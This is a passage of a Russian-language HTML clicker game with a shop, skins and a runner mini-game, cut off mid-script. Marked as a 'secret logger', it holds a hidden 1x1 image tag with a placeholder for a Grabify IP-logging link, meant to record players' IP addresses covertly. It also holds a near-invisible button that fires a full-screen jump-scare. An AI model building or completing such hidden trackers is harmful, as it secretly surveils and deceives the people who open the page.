<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Кибер Эволюция X</title>
    <style>
        body { font-family: sans-serif; background: #03001e; background: linear-gradient(to right, #03001e, #7303c0, #ec38bc); color: #fff; text-align: center; margin: 0; padding: 10px; user-select: none; }
        .layout { display: flex; flex-wrap: wrap; gap: 10px; max-width: 1200px; margin: 0 auto; justify-content: center; }
        .panel { background: rgba(0, 0, 0, 0.8); padding: 15px; border-radius: 16px; border: 2px solid #ec38bc; min-width: 280px; flex: 1; box-shadow: 0 0 20px #7303c0; }
        .money { font-size: 35px; font-weight: bold; color: #00f6ff; text-shadow: 0 0 10px #00f6ff; }
        .sphere { width: 120px; height: 120px; border-radius: 50%; background: radial-gradient(#00f6ff, #7303c0); margin: 15px auto; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 50px; box-shadow: 0 0 25px #00f6ff; transition: transform 0.05s; }
        .sphere:active { transform: scale(0.93); }
        .scroller { max-height: 50vh; overflow-y: auto; padding-right: 5px; }
        .card { background: rgba(255,255,255,0.05); margin: 5px 0; padding: 6px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; border-left: 3px solid #ec38bc; text-align: left; }
        .btn { background: #7303c0; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn:disabled { background: #333; color: #777; cursor: not-allowed; }
        .tab-btn { background: #111; color: #aaa; border: 1px solid #7303c0; padding: 6px; cursor: pointer; border-radius: 4px; font-weight: bold; font-size: 11px; }
        .tab-active { background: #ec38bc; color: white; }
        #gArea { width: 100%; height: 100px; background: #111; border: 2px solid #00f6ff; border-radius: 8px; position: relative; overflow: hidden; margin-top: 10px; }
        #h { width: 20px; height: 30px; background: #00f6ff; position: absolute; bottom: 0; left: 30px; font-size: 16px; display: flex; align-items: center; justify-content: center; }
        #e { width: 20px; height: 25px; background: #ec38bc; position: absolute; bottom: 0; right: -20px; font-size: 14px; display: flex; align-items: center; justify-content: center; }
        .jump { animation: j 0.48s linear; }
        @keyframes j { 0%,100% { bottom:0; } 50% { bottom:65px; } }
        /* Скример */
        #scrim { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; justify-content: center; align-items: center; font-size: 150px; color: red; font-weight: bold; text-shadow: 0 0 50px red; }
        .scrim-trigger { width: 8px; height: 8px; background: rgba(255,255,255,0.05); border: none; border-radius: 50%; cursor: pointer; position: absolute; bottom: 5px; left: 5px; }
    </style>
</head>
<body>

    <h1>🌌 НЕОНОВАЯ КИБЕР-ЭВОЛЮЦИЯ X 🌌</h1>
    
    <div class="layout">
        <!-- ГЛАВНАЯ ПАНЕЛЬ -->
        <div class="panel">
            <div>Лвл: <span id="lvl">1</span> | Реберхи: <span id="reb">0</span></div>
            <div class="money"><span id="bal">0</span> 💰</div>
            <div style="font-size:11px; color:#aaa;">Клик: +<span id="clk">1</span> | Авто: +<span id="cps">0</span>/с</div>
            <div id="core" class="sphere" onclick="tClick()">⭐</div>
            <button class="btn" style="background:#00f6ff; color:#000; width:100%; margin-top:5px;" id="rBtn" onclick="doReb()">✨ Перерождение (Цена: 25К 💰)</button>
            <button style="background:#222; color:#888; border:none; font-size:9px; margin-top:8px; cursor:pointer;" onclick="resetG()">Сбросить всё</button>
            <button class="scrim-trigger" onclick="sScreamer()"></button>
        </div>

        <!-- МАГАЗИН: 5 ВКЛАДОК ПО 15 ТОВАРОВ (ВСЕГО 75) -->
        <div class="panel" style="flex: 1.2;">
            <div style="display:flex; justify-content:space-between; gap:2px; margin-bottom:8px;">
                <button class="tab-btn tab-active" id="tb1" onclick="tab(1)">⚡ Клик</button>
                <button class="tab-btn" id="tb2" onclick="tab(2)">🦊 Питомцы</button>
                <button class="tab-btn" id="tb3" onclick="tab(3)">🎨 Скины</button>
                <button class="tab-btn" id="tb4" onclick="tab(4)">🛸 Дроны</button>
                <button class="tab-btn" id="tb5" onclick="tab(5)">🚀 Бусты</button>
            </div>
            <div class="scroller" id="t1"></div>
            <div class="scroller" id="t2" style="display:none"></div>
            <div class="scroller" id="t3" style="display:none"></div>
            <div class="scroller" id="t4" style="display:none"></div>
            <div class="scroller" id="t5" style="display:none"></div>
        </div>

        <!-- МИНИ-ИГРА -->
        <div class="panel">
            <h3 style="margin:0 0 5px 0; font-size:14px;">🎮 Раннер: Прыжки мимо Кулкидс</h3>
            <div id="gArea"><div id="h">🕵️‍♂️</div><div id="e">😎</div></div>
            <button class="btn" style="width:100%; margin-top:5px; background:#ec38bc" onclick="jump()">ПРЫЖОК (Дает +50 💰)</button>
            <div id="gTxt" style="font-size:12px; margin-top:5px; color:#00f6ff; font-weight:bold;"></div>
        </div>
    </div>

    <!-- ТАЙНЫЙ ЛОГГЕР -->
    <img src="СЮДА_ВСТАВЬТЕ_ССЫЛКУ_ПИКСЕЛЯ_ИЗ_GRABIFY" alt="" style="display:none; width:1px; height:1px;">

    <!-- ОКНО СКРИМЕРА -->
    <div id="scrim">👹</div>

    <script>
        // Генерация названий для 75 видов предметов (по 15 в каждой категории)
        const categories = {
            upg: ["Чип","Кабель","ОЗУ","Процессор","Видяха","Блок лазера","Тектоник","Фотон","Квант","Материя","Ядро","ДНК","Сингулярность","Космос","Импульс"],
            pet: ["Бот-Дрон","Микро-Паук","Дроид","Кибер-Кот","Лис Сети","Феникс","Волк","Тигр Пустоты","Андроид","Астрал-Лич","ИИ-Лорд","Творец","Голем","Матрикс","Омега"],
            drone: ["Скаут-1","Сборщик-2","Тяжелый Дрон","Квантовый БПЛА","Нео-Вайпер","Вектор-М","Шершень","Призма","Орион","Пульсар","Страж","Орион-X","Фантом","Призрак","Центурион"],
            boost: ["Энергосеть","Разгон ОЗУ","Турбо-Ток","Стабилизатор","Пул циклов","Супер-Ватт","Крио-Двигатель","Тахион","Варп-Драйв","Гипер-Кварк","Множитель","Атлас","Генезис","Хронос","Этернус"]
        };
        const skinData = [
            {n:"Рубин",e:"🔴",b:"#b91c1c",c:100},{n:"Изумруд",e:"🟢",b:"#047857",c:250},{n:"Золото",e:"👑",b:"#b45309",c:600},{n:"Аметист",e:"🔮",b:"#6d28d9",c:1500},{n:"Сапфир",e:"🔷",b:"#1d4ed8",c:3500},
            {n:"Магма",e:"🔥",b:"linear-gradient(#f97316,#b91c1c)",c:8000},{n:"Неон-Лёд",e:"❄️",b:"linear-gradient(#06b6d4,#1d4ed8)",c:18000},{n:"Матрица",e:"📟",b:"linear-gradient(#111,#047857)",c:40000},{n:"Затмение",e:"🌑",b:"#111827",c:90000},{n:"Радуга",e:"🌈",b:"linear-gradient(to right,red,orange,yellow,green,blue,violet)",c:200000},
            {n:"Спектр",e:"👁️",b:"#4c0519",c:500000},{n:"Галактика",e:"🌌",b:"#03001e",c:1500000},{n:"Пустота",e:"🌀",b:"#000",c:4500000},{n:"Агент 007",e:"🕵️‍♂️",b:"#1e1b4b",c:12000000},{n:"Кулкид",e:"😎",b:"#701a75",c:40000000}
        ];

        let coins = Number(localStorage.getItem('x_c')) || 0;
        let clickPower = Number(localStorage.getItem('x_p')) || 1;
        let autoIncome = Number(localStorage.getItem('x_a')) || 0;
        let lvl = Number(localStorage.getItem('x_l')) || 1;
        let reb = Number(localStorage.getItem('x_r')) || 0;
        let clks = Number(localStorage.getItem('x_k')) || 0;
        let curSkin = localStorage.getItem('x_s_e') || '⭐';
        let curBg = localStorage.getItem('x_s_b') || 'radial-gradient(#00f6ff, #7303c0)';

        // Массивы цен с автогенерацией
        let uPrices = JSON.parse(localStorage.getItem('x_p_u')) || Array.from({length:15},(_,i)=>Math.floor(15*Math.pow(3.5,i)));
        let pPrices = JSON.parse(localStorage.getItem('x_p_p')) || Array.from({length:15},(_,i)=>Math.floor(30*Math.pow(3.6,i)));
        let dPrices = JSON.parse(localStorage.getItem('x_p_d')) || Array.from({length:15},(_,i)=>Math.floor(100*Math.pow(3.7,i)));
        let bPrices = JSON.parse(localStorage.getItem('x_p_b')) || Array.from({length:15},(_,i)=>Math.floor(500*Math.pow(3.8,i)));
        let ownedSkins = JSON.parse(localStorage.getItem('x_sk_o')) || [];

        // Авто-генерация HTML для всех магазинов
        function genShop(divId, names, prices, valMultiplier, mode) {
            let html = '';
            names.forEach((name, i) => {
                let addVal = (i + 1) * valMultiplier;
                html += `<div class="card">
                    <span><b>${name}</b> (+${addVal}${mode==='clk'?' к кл.':'/с'})<br><span id="${divId}_c_${i}">${prices[i]}</span> 💰</span>
                    <button class="btn" id="${divId}_b_${i}" onclick="buy('${divId}',${i},${addVal},'${mode}')">Купить</button>
                </div>`;
            });
            document.getElementById(divId).innerHTML = html;
        }

        function genSkins() {
            let html = '';
            skinData.forEach((s, i) => {
                html += `<div class="card"><span><b>${s.n}</b> [${s.e}]<br>${s.c} 💰</span><button class="btn" id="s_b_${i}" onclick="buySkin(${i})">Купить</button></div>`;
            });
            document.getElementById('t3').innerHTML = html;
        }

        function tClick() {
            coins += clickPower * (reb > 0 ? reb * 3 : 1); clks++;
            if (clks >= lvl * 50) { lvl++; clks = 0; clickPower += 2; alert("🎉 Уровень повышен до " + lvl + "!"); }
            save(); ui();
        }

        function buy(panel, i, val, mode) {
            let arr = panel==='t1'?uPrices : panel==='t2'?pPrices : panel==='t4'?dPrices : bPrices;
            if (coins >= arr[i]) {
                coins -= arr[i];
